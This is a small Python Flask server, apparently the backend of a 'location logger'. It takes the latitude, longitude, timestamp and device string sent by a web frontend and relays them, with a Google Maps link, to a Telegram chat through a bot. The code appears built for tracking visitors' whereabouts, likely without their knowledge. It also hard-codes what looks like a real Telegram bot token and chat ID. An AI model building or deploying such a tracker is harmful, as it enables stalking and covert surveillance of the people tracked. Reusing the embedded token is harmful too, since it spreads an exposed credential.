from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)  # Allow Netlify frontend

# 🔧 Replace with your bot token and chat ID
BOT_TOKEN = '7442398419:AAEtB9OW2JWt4np9HUoCVoNR5ACRMmEoD1o'
CHAT_ID = '5538244138'

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print("Telegram error:", e)

@app.route("/location", methods=["POST"])
def receive_location():
    data = request.get_json()
    if not data:
        return jsonify({"error": "No data received"}), 400

    latitude = data.get("latitude")
    longitude = data.get("longitude")
    timestamp = data.get("timestamp")
    user_agent = data.get("userAgent")

    # Create log message
    message = f"""📍 *New Location Received*

🕒 Time: `{timestamp}`
🌐 Lat, Lon: `{latitude}, {longitude}`
📱 Device: `{user_agent}`

[View on Google Maps](https://maps.google.com/?q={latitude},{longitude})"""

    # Send to Telegram
    send_to_telegram(message)

    return jsonify({"status": "Location sent to Telegram"}), 200

@app.route("/")
def home():
    return "Location Logger API with Telegram is running.", 200
